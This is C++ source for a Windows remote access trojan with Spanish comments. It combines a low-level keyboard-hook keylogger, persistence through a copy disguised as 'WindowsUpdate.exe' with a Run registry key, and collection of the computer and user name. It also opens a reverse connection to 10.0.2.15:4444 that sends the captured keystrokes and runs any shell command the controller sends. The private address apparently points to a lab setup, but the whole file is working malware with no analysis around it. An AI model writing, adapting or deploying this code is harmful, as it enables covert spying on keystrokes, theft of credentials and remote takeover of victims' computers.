#include <iostream>
#include <winsock2.h>
#include <string>
#include <array>
#include <memory>
#include <windows.h>
#include <thread>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib") // Librería necesaria para GetUserName

// --- VARIABLE GLOBAL PARA EL KEYLOGGER ---
std::string registroTeclas = "";

// --- 1. FUNCIÓN DE RECONOCIMIENTO (NUEVA) ---
std::string obtenerInfoSistema() {
    char pcName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD pcSize = sizeof(pcName);
    GetComputerNameA(pcName, &pcSize);

    char userName[256];
    DWORD userSize = sizeof(userName);
    GetUserNameA(userName, &userSize);

    // Formato: NOMBRE-PC|USUARIO
    return std::string(pcName) + "|" + std::string(userName);
}

// --- 2. FUNCIONES DEL KEYLOGGER ---
LRESULT CALLBACK HookTeclado(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = pKeyBoard->vkCode;

        if (vkCode == VK_BACK) registroTeclas += "[BACKSPACE]";
        else if (vkCode == VK_RETURN) registroTeclas += "\n";
        else if (vkCode == VK_SPACE) registroTeclas += " ";
        else if (vkCode >= 0x30 && vkCode <= 0x5A) registroTeclas += (char)vkCode; 
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void IniciarKeylogger() {
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, HookTeclado, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hhkLowLevelKybd);
}

// --- 3. FUNCIÓN DE PERSISTENCIA ---
void instalarPersistencia() {
    char rutaPropia[MAX_PATH];
    GetModuleFileNameA(NULL, rutaPropia, MAX_PATH);
    std::string rutaDestino = std::string(getenv("APPDATA")) + "\\WindowsUpdate.exe";
    CopyFileA(rutaPropia, rutaDestino.c_str(), FALSE);

    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "ServicioTecnicoWindows", 0, REG_SZ, (BYTE*)rutaDestino.c_str(), (DWORD)rutaDestino.length());
    RegCloseKey(hKey);
}

// --- 4. FUNCIÓN PARA EJECUTAR COMANDOS (RCE) ---
std::string ejecutarComando(const char* cmd) {
    std::array<char, 128> buffer;
    std::string resultado;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) return "Error al ejecutar el comando.\n";
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        resultado += buffer.data();
    }
    return resultado;
}

// --- 5. MAIN ---
int main() {
    // A. Asegurar persistencia
    instalarPersistencia();

    // B. Iniciar Keylogger
    std::thread hiloKeylogger(IniciarKeylogger);
    hiloKeylogger.detach(); 

    // C. Configuración de Red
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serv_addr;
    char buffer[4096] = {0};

    WSAStartup(MAKEWORD(2,2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(4444);
    serv_addr.sin_addr.s_addr = inet_addr("10.0.2.15"); 

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        return -1;
    }

    // --- ENVIAR IDENTIDAD AL CONECTAR (CAMBIO AQUÍ) ---
    std::string identidad = obtenerInfoSistema();
    send(sock, identidad.c_str(), (int)identidad.length(), 0);

    // D. Bucle de Control
    while (true) {
        memset(buffer, 0, 4096);
        int valread = recv(sock, buffer, 4096, 0);
        if (valread <= 0) break;

        std::string comando(buffer);

        if (comando == "dump") {
            if (registroTeclas.empty()) {
                send(sock, "Buffer vacio.\n", 14, 0);
            } else {
                send(sock, registroTeclas.c_str(), (int)registroTeclas.length(), 0);
                registroTeclas = ""; 
            }
        } 
        else {
            std::string respuesta = ejecutarComando(comando.c_str());
            if(respuesta.empty()) respuesta = "Comando ejecutado.\n";
            send(sock, respuesta.c_str(), (int)respuesta.length(), 0);
        }
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
